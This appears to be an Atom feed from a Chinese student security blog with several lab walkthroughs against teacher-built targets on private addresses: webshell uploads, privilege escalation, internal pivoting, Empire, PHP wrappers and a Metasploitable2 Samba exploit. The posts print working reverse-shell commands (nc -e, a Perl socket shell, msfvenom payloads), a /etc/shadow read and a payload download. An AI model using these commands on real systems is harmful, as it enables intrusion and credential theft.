shell ,"></a>4. 进来之后发现是一个python shell ,</h4><p>使用命令：python –c ‘import pty;pty.spawn(“/bin/bash”)’</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image15.png"></p><h4 id="5-在-tab目录下有一个script-sh文件，所有者是root，并拥有所有权限"><a href="#5-在-tab目录下有一个script-sh文件，所有者是root，并拥有所有权限" class="headerlink" title="5.  在/tab目录下有一个script.sh文件，所有者是root，并拥有所有权限"></a>5.  在/tab目录下有一个script.sh文件，所有者是root，并拥有所有权限</h4><p>我们使用msfcenom来生成一段bash code 插入恶意代码到这个文件中</p><p>命令：msfvenom –p cmd/unix/reverse_netcat lhost=192.168.0.159 lport=4455 R</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image16.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image17.png"></p><h4 id="6-我们将恶意代码插入到文件中-命令-echo-“xxxxxxxxxxxxxxx”-gt-script-sh"><a href="#6-我们将恶意代码插入到文件中-命令-echo-“xxxxxxxxxxxxxxx”-gt-script-sh" class="headerlink" title="6.  我们将恶意代码插入到文件中 命令  echo “xxxxxxxxxxxxxxx”&gt;script.sh"></a>6.  我们将恶意代码插入到文件中 命令  echo “xxxxxxxxxxxxxxx”&gt;script.sh</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image18.png"></p><h4 id="7-执行后，我们去msf里监听就好了-命令：use-exploit-multi-handler"><a href="#7-执行后，我们去msf里监听就好了-命令：use-exploit-multi-handler" class="headerlink" title="7.  执行后，我们去msf里监听就好了  命令：use exploit/multi/handler"></a>7.  执行后，我们去msf里监听就好了  命令：use exploit/multi/handler</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image19.png"></p><h5 id="sud-u-jens-绝对路径"><a href="#sud-u-jens-绝对路径" class="headerlink" title="sud -u jens  绝对路径"></a>sud -u jens  绝对路径</h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对Typhoon的一次入侵&quot;&gt;&lt;a href=&quot;#对Typhoon的一次入侵&quot; class=&quot;headerlink&quot; title=&quot;对Typhoon的一次入侵&quot;&gt;&lt;/a&gt;对Typhoon的一次入侵&lt;/h1&gt;&lt;p&gt;&lt;em&gt;老师开了搭建了一个网站让我们尝试入侵  Ip
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>入侵提权内网渗透(完整版)</title>
    <link href="https://pgg666.org/2019/04/28/%E5%85%A5%E4%BE%B5%E6%8F%90%E6%9D%83%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://pgg666.org/2019/04/28/入侵提权内网渗透/</id>
    <published>2019-04-27T16:00:00.000Z</published>
    <updated>2019-04-28T15:30:20.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="入侵提权内网渗透-完整版"><a href="#入侵提权内网渗透-完整版" class="headerlink" title="入侵提权内网渗透(完整版)"></a>入侵提权内网渗透(完整版)</h1><p>​              #<u>注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈</u></p><p>​         <strong>亲爱的老师给了我们一个ip  192.168.0.178     提示：上传的文件会在5分钟内自动删除，上传的文件名会被md5加密并随机加上1—100内的md5  重命名，当然，看源码也看的出来</strong></p><p><img src="http://kan.027cgb.com/613977/内网渗透/1.png"></p><ul><li>老规矩，先扫描一下网站*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/2.png"></p><ul><li>先登录robots.txt*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/3.png"></p><ul><li></li><li></li><li>我们登录试试这个提示网点*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/4.png"></p><ul><li>是一个上传页面，我们上传一个马上去，  因为我的马是php  所以我在代码前面加一个图片格式的代码*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/5.png"></p><ul><li>就先不上传了   先写一个python的脚本    好方便等会爆破目录*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/6.png"></p><ul><li>把脚本跑出的内容放在txt里面这些就不讲了  先上传木马*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/7.png"></p><ul><li></li><li></li><li></li><li>出现了  旁边的字母  就说明已经上传成功了，抓紧时间  只有半个小时  抓包显示文件上传到   uploads/?   目录    那我们就随便在/后面输入一个文件，然后抓包爆破*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/8.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/9.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/10.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/11.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/12.png"></p><p><em>爆破出来后直接去浏览器（不想开车）  nc –e<br>/bin/sh 192.168.0.126 4433</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/13.png"></p><p>​      <em>用反弹来拿shell，老规矩啊      nc –lvp 4433</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/14.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/16.png"></p><p>​     </p><p>​             <em>现在就是已经连上来了  我们先提个权，避免5分钟后断掉连接      Python –c ‘import pty;pty.spawn(“/bin/sh”)’</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/17.png"></p><p>​     </p><p>​        *使用了这个命令后 就稍微提了权   上面图片有过程    </p><p>使用 find / -user root -perm -4000 -print 2&gt;/dev/null   find / -perm -u=s-type f 2&gt;/dev/null   其中一个 命令   查看可执行文件</p><p><img src="http://kan.027cgb.com/613977/内网渗透/50.png"></p><p>tail  可以查看这些文件，用法可参考百度  搜索linux tail用法使用   Tail –n100 /etc/shadow  </p><p>来查看 用户密码    </p><p><img src="http://kan.027cgb.com/613977/内网渗透/18.png"></p><p>​    </p><p>​        <em>已经爆出来了root密码  但是它被加密了  我们复制这串密文，用kail自带的解密去破解</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/19.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/20.png"></p><p>​       <em>解密后<br>​                  发现密码是  jojn  我们直接  su root 登录</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/21.png"></p><p>​    </p><p>   <em>哈哈<br>​             我们现在是root权限<br>​            真鸡儿猛,但并没有什么用  我们到处看看，发现了有个wp-config.php<br>​            文件  一般都是配置文件 查看内容发现 是连接数据库的配置文件。账户密码皆为wordpress 。。emm好像           也用不上，数据库连接需要内网</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/22.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/23.png"></p><p>​          <em>我们使用msf生成监听 获得内网的ip地址</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/24.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/25.png"></p><p>​       <em>然后利用刚刚拿到的shell  扫描他的路由</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/26.png"></p><p>​         <em>进入扫描内网模块</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/27.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/28.png"></p><p>​         发现有一个ip 开着3306 端口 数据库的端口 数据库连接：mysql -u wordpress -pwordpress -h x.x.x.x 查数据库-&gt;show databases；使用数据库：use wordpress； 查看表：-&gt; show tables ; 查数据;-&gt; select * from XXXXX 获得账户密码， 密码解密</p><p><img src="http://kan.027cgb.com/613977/内网渗透/29.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/30.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/31.png"></p><p><em>ssh连接   ssh 账户名@ip</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/32.png"></p><p><em>docker ps 查看进程  进入 容器 docker attach id</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/33.png"></p><p><em>root@252fa8cb1646:/# root -i -t ubuntu /bin/bash   ls 进入root/root ls cat flag   得到    flag</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/34.png"></p><h1 id="这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"><a href="#这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。" class="headerlink" title="#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"></a><u>#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。</u></h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;入侵提权内网渗透-完整版&quot;&gt;&lt;a href=&quot;#入侵提权内网渗透-完整版&quot; class=&quot;headerlink&quot; title=&quot;入侵提权内网渗透(完整版)&quot;&gt;&lt;/a&gt;入侵提权内网渗透(完整版)&lt;/h1&gt;&lt;p&gt;​              #&lt;u&gt;注：这次靶机测试，
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>对网站后台的一次大马攻击并反弹提权</title>
    <link href="https://pgg666.org/2019/04/22/%E5%AF%B9%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%A7%E9%A9%AC%E6%94%BB%E5%87%BB%E5%B9%B6%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83/"/>
    <id>https://pgg666.org/2019/04/22/对网站后台的一次大马攻击并反弹提权/</id>
    <published>2019-04-21T16:00:00.000Z</published>
    <updated>2019-04-22T14:51:32.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对网站后台的一次大马攻击并反弹提权"><a href="#对网站后台的一次大马攻击并反弹提权" class="headerlink" title="对网站后台的一次大马攻击并反弹提权"></a>对网站后台的一次大马攻击并反弹提权</h1><p><strong>前言：</strong>   <em>经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的</em></p><p><u>所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>上找到的，大家要仔细分析，千万不要被黑吃黑</u></p><ol><li><p><em>实验开始，老师给了一段ip  192.168.0.127拿到ip  我先用nmap扫描看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/1.png"></p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/2.png"></p><ol start="2"><li><p><em>它告诉我们 博客正在搭建  既然有的话  那我就得扫一下它的目录了</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/3.png"></p><ol start="3"><li><em>不得了 .git源码泄露了   还爆出了admin.php等目录，我们先把他源码爆出了，使用 GitHack  嗯，你们可以去<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>下载它   开始爆了</em></li></ol></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/4.png"></p><p>爆出来了我们去看一看</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/5.png"></p><ol start="4"><li><p><em>直接就出来了账号密码  我们去访问 admin.php  使用这个账号密码  看能不能登录</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/6.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/7.png"></p><ol start="5"><li><p><em>现在上传大马，看看能不能连接</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/8.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/9.png"></p></li></ol></li></ol><ol start="6"><li><p>*现在我们开始反弹提权  木马shell打命令</p><p>perl -e’use Socket;$i=”192.168.0.135”;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>kail 命令打 nc –lvp 1235*</p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/10.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/11.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/12.png"></p><p>我们cd ..  看看根目录</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/13.png"></p><ol start="7"><li><p><em>Home 是储存账户信息的 我们进去看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/14.png"></p></li><li><p><em>我们用exp打这个文件   开一个kali界面   使用命令：msfvenom -p<br>  cmd/unix/reverse_bash LHOST=192.168.0.153 LPORT=1143</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/15.png"></p></li><li><p><em>现在我们把它加到.sh文件中  ，这里我们就用kail的shell加</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/16.png"></p></li><li><p><em>然后我们kail用msf进入监听模块，去监听他   监听exp =  exploit/multi/handler  Payload是我们生成时候用的payload</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/17.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/18.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/19.png"></p></li></ol><p><del>一次提权就结束了 实际操作还是需要多多练习呢</del></p><p>#注：  <strong>生活就是冲着未来，不要总沉浸在悲伤里</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对网站后台的一次大马攻击并反弹提权&quot;&gt;&lt;a href=&quot;#对网站后台的一次大马攻击并反弹提权&quot; class=&quot;headerlink&quot; title=&quot;对网站后台的一次大马攻击并反弹提权&quot;&gt;&lt;/a&gt;对网站后台的一次大马攻击并反弹提权&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;前言
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>域渗透神器Empire的一次简单渗透</title>
    <link href="https://pgg666.org/2019/04/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Empire%E7%9A%84%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/"/>
    <id>https://pgg666.org/2019/04/14/域渗透神器Empire的一次简单渗透/</id>
    <published>2019-04-13T16:00:00.000Z</published>
    <updated>2019-04-14T03:31:02.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域渗透神器Empire的一次简单渗透"><a href="#域渗透神器Empire的一次简单渗透" class="headerlink" title="域渗透神器Empire的一次简单渗透"></a><strong>域渗透神器Empire的一次简单渗透</strong></h1><p>​          <strong>需要工具:win7系统    kail系统</strong></p><p>​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习</p><ol><li>​      <u>Empire的安装:</u></li></ol><pre><code>Git clone https://github.com/EmpireProject/Empire.gitCd Empire/Cd setup/./install.sh</code></pre><ol start="2"><li><pre><code> 现在就是第一步，打开Empire 首先 cd Empire/ 接着 cd setup/ 最后  ./reset.sh  就能打开了 下面是我的演示图片</code></pre></li></ol><p><img src="http://kan.027cgb.com/613977/1.png"></p><ol start="3"><li><u>可以看到，有285个模块，0个监听，还有0个代理,输入listeners  进入监听</u></li></ol><p><img src="http://kan.027cgb.com/613977/2.png"></p><ol start="4"><li><u>用 info查看需要设置的选项，设置后使用execute运行</u></li></ol><p><img src="http://kan.027cgb.com/613977/3.png"></p><p><img src="http://kan.027cgb.com/613977/4.png"></p><ol start="5"><li><u>生成载荷 mian命令返回主菜单设置listener，然后执行execute生成dll木马,存在/tmp/launcher.dll中</u></li></ol><p><img src="http://kan.027cgb.com/613977/5.png"></p><p><img src="http://kan.027cgb.com/613977/6.png"></p><ol start="6"><li><u>Win7 打开cmd  运行这串代码而那个cmd一闪而过。这就相当于得到一个MSF会话了 选择Jdrops进入会话,进入终端输入help查看可以使用的命令</u></li></ol><p><img src="http://kan.027cgb.com/613977/7.png"></p><ol start="7"><li><u> 我们来通过shell 截被攻击机屏幕的截图</u></li></ol><p><img src="http://kan.027cgb.com/613977/8.png"></p><p><img src="http://kan.027cgb.com/613977/9.png"></p><p><strong>本次实验就到此为止，希望同学们早日成才</strong></p><p>#<u>注</u>：<strong><em>珍惜一个人的生活</em></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;域渗透神器Empire的一次简单渗透&quot;&gt;&lt;a href=&quot;#域渗透神器Empire的一次简单渗透&quot; class=&quot;headerlink&quot; title=&quot;域渗透神器Empire的一次简单渗透&quot;&gt;&lt;/a&gt;&lt;strong&gt;域渗透神器Empire的一次简单渗透&lt;/stro
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>伪协议</title>
    <link href="https://pgg666.org/2019/01/17/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://pgg666.org/2019/01/17/php代码审计篇之伪协议/</id>
    <published>2019-01-16T16:00:00.000Z</published>
    <updated>2019-01-17T13:29:12.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计之伪协议"><a href="#代码审计之伪协议" class="headerlink" title="代码审计之伪协议"></a><strong>代码审计之伪协议</strong></h1><p><em>有四种常见伪协议：</em></p><ol><li>file://协议 </li><li>php://filter协议 </li><li>php://input协议 </li><li>data://协议</li></ol><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议 :"></a>file://协议 :</h3><p><em>用于访问本地系统文件</em></p><p><a href=""><img src="http://img.027cgb.com/613977/代码审计伪协议/1.png"></a></p><p><em>首先创建一个可控的php文件</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/2.png"></a></p><p><em>然后再生成一个1.txt的文档</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/3.png"></a></p><p><em>然后打开phpstudy  进入浏览器进入到file.php里并输入以下内容便可以达到目的</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/4.png"></a></p><h3 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议:"></a>php://filter协议:</h3><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/5.png"></a></p><p><em>直接在浏览器加上以下内容</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/6.png"></a></p><h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议:"></a>php://input协议:</h3><p><em>可以访问原始数据的只读流</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/7.png"></a></p><p><em>输入以下内容便能执行代码执行的功能</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/8.png"></a></p><p><em>同理，我们也可以写入一个文件  代码如下：</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/9.png"></a></p><p><em>同理，我们是不是可以写入一句话木马，然后用菜刀连接</em></p><h3 id="data-协议："><a href="#data-协议：" class="headerlink" title="data://协议："></a>data://协议：</h3><p><em>数据</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/10.png"></a></p><p><em>执行代码如下：</em></p><p><img src="http://img.027cgb.com/613977/代码审计伪协议/11.png"></p><p><em>如果想执行bs64的话就在后面加上bs64就好了</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/12.png"></a></p><p>  注：一步一步的成长</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计之伪协议&quot;&gt;&lt;a href=&quot;#代码审计之伪协议&quot; class=&quot;headerlink&quot; title=&quot;代码审计之伪协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;代码审计之伪协议&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;em&gt;有四种常见伪协议：&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透Met2</title>
    <link href="https://pgg666.org/2019/01/17/%E6%B8%97%E9%80%8FMet2/"/>
    <id>https://pgg666.org/2019/01/17/渗透Met2/</id>
    <published>2019-01-16T16:00:00.000Z</published>
    <updated>2019-04-03T06:28:24.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马"><a href="#假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马" class="headerlink" title="假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马"></a>假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马</h1><p>​           <strong>前言：</strong> <em>每个操作系统都会存在各种Bug,像Windows这样有版权的操作系统，微软公司会快速地开发针对这些Bug或漏洞的补丁，并为用户提供更新。全世界有大量的漏洞研究人员会夜以继日地发现、研究新的Bug,这些没有公布补丁的Bug就是所谓的0day漏洞，由于这种漏洞对网络安全具有巨大威胁，因此0day漏洞页成为黑客的最爱。实际上能掌握0day的黑客少之又少。</em></p><ol><li>首先，先进入msf框架内，在命令行输入：msfconsole   便可以进入msf内</li></ol><p><img src="http://tu.027cgb.com/613977/共计/1-jpg.png"></p><ol start="2"><li><p>首先第一步用nmap扫描目标主机的Ip   </p><p><em>使用命令：nmap –sV 192.168.127.136</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/2-jpg.png"></p><ol start="3"><li><p>在扫描结果中出现了Samba smbd 3.x-4.x 的服务，我们可以用search XXX  去查看可用的exploit   </p><p>  <em>使用命令： search samba</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/3-jpg.png"></p><p>   当看到excellent  说明是比较新，可以使用的</p><p>   <img src="http://tu.027cgb.com/613977/共计/4.png"></p><p>   那我们便使用这个exploit  </p><p>   命令语句：use exploit/multi/samba/usermap_script*</p><p>   <img src="http://tu.027cgb.com/613977/共计/5.png"></p><ol start="4"><li><p>当我们进入后先看看他需要的设置和可用的payload</p><p>   命令： show options*</p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/6.png"></p><p>​        命令：show payloads*</p><p><img src="http://tu.027cgb.com/613977/共计/7.png"></p><ol start="5"><li><p>此时我们选择 的payload 是  cmd/unix/reverse  </p><p><em>使用命令：set payload cmd/unix/reverse</em></p><p><img src="http://tu.027cgb.com/613977/共计/8.png"></p></li></ol><p>​      现在开始绑定我们的数据  首先先确定被攻击主机的IP</p><p>​      命令是：set rhosts 192.168.127.136*</p><p><img src="http://tu.027cgb.com/613977/共计/9.png"></p><p>​      绑定端口   命令： set RPORT 139     这个端口必须得和发现漏洞德端口一致</p><p>​      绑定攻击主机的Ip   </p><p>​      命令：set lHOST 192.168.127.138*</p><p><img src="http://tu.027cgb.com/613977/共计/10.png"></p><ol start="6"><li><p>然后就是直接连接被攻击机</p><p><em>命令： run</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/11.png"></p><ol start="7"><li><p>这里我们已经连上被攻击机了 我们来查看一下我们是什么用户</p><p><em>命令：Whomai</em></p><p><img src="http://tu.027cgb.com/613977/共计/12.png"></p></li><li><p>经拿到被攻击机的shell了，但是并不满足如痴，想上传一个木马病毒，说干就干新开一个命令行窗口，新建一个病毒</p><p><em>命令：msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/13.png"></p><p>​         已经好了  我们ls看一下</p><p><img src="http://tu.027cgb.com/613977/共计/14.png"></p><ol start="9"><li><p>现在我们开启ftp服务，用控制的shell去下载我们的病毒</p><p><em>命令： python -m SimpleHTTPServer 8000</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/15.png"></p><ol start="10"><li><p>现在开始控制被攻击主机的shell去下载</p><p><em>命令： wget &lt;<a href="http://192.168.127.138:8000/payload.elf" target="_blank" rel="noopener">http://192.168.127.138:8000/payload.elf</a></em></p><p><em>&gt;</em></p><p><img src="http://tu.027cgb.com/613977/共计/16.png"></p></li></ol><p>​     已经下载成功了   我们ls查看下</p><p><img src="http://tu.027cgb.com/613977/共计/17.png"></p><ol start="11"><li><p>已经有了 现在我们帮这个文件添加可执行权</p><p>命令  chmod +x payload.elf</p><p>然后执行</p><p>命令：  ./payload.elf</p></li></ol><pre><code>&lt;img src=&quot;http://tu.027cgb.com/613977/共计/18.png&quot; /&gt;</code></pre><p>​       当然，此时是没有任何反应   现在我们进入exploit/multi/handler模块</p><p>​        <img src="http://tu.027cgb.com/613977/共计/19.png"></p><p>​      然后进入  linux/x86/meterpreter/reverse_tcp   模块</p><p><img src="http://tu.027cgb.com/613977/共计/20.png"></p><p>​      Show options一下</p><p><img src="http://tu.027cgb.com/613977/共计/21.png"></p><ol start="12"><li>绑定攻击主机ip，然后运行挂起，在shell那边运行那个程序，然后sessions  一下</li></ol><p><img src="http://tu1.027cgb.com/613977/共计/22.png"></p><ol start="13"><li>然后选择 sessions 1  就可以进入shell了</li></ol><p><img src="http://tu1.027cgb.com/613977/共计/23.png"></p><p>​       #注: <strong>好了，是不是很简单呀，不过要多尝试哦， 对其他系统也是可以的，只是命令不同</strong>-_—</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马&quot;&gt;&lt;a href=&quot;#假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pgg学长</title>
    <link href="https://pgg666.org/2018/09/30/index/"/>
    <id>https://pgg666.org/2018/09/30/index/</id>
    <published>2018-09-30T09:25:30.000Z</published>
    <updated>2019-05-31T10:55:02.803Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
</feed>
